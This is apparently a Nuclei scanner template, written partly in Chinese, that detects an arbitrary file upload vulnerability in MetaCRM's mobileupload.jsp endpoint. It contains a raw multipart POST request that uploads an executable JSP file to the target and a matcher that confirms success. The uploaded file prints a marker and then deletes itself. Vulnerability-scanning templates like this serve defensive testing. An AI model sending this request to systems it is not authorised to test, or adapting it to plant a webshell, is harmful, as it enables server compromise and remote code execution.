id: metasoft-crm-mobileupload-fileupload
info:
  name: 美特CRM mobileupload.jsp 任意文件上传漏洞
  author: leadlife
  severity: critical
  description: MetaCRM是一款智能平台化CRM软件,通过提升企业管理和协同办公,全面提高企业管理水平和运营效率,帮助企业实现卓越管理。美特CRM mobileupload.jsp 接口存在任意文件上传漏洞，攻击者无需经过严格身份验证即可向服务器上传任意类型的文件，包括可执行的恶意脚本。一旦利用此漏洞，攻击者可能在服务器上部署后门、WebShell 等恶意程序，从而实现远程代码执行、服务器控制，甚至进一步窃取敏感数据或破坏业务系统的正常运行。
  reference: 
    - https://www.yuque.com/lvguo-pibd8/fqbwsx/ctwrdwavxm9cwm6g
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    hunter-query: demo
    tips: 响应包中 var parentaff ,var filepath 分别标注了 filename,path
    repair:
    version:
  tags: fileupload,metasoft

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y%M%D%H%M%S")}}'

http:
  - raw:
      - |
        POST /mobile/mobileupload.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary123456
        Content-Length: 269

        ------WebKitFormBoundary123456
        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"

        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------WebKitFormBoundary123456--
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'parentaff','filepath')
        condition: and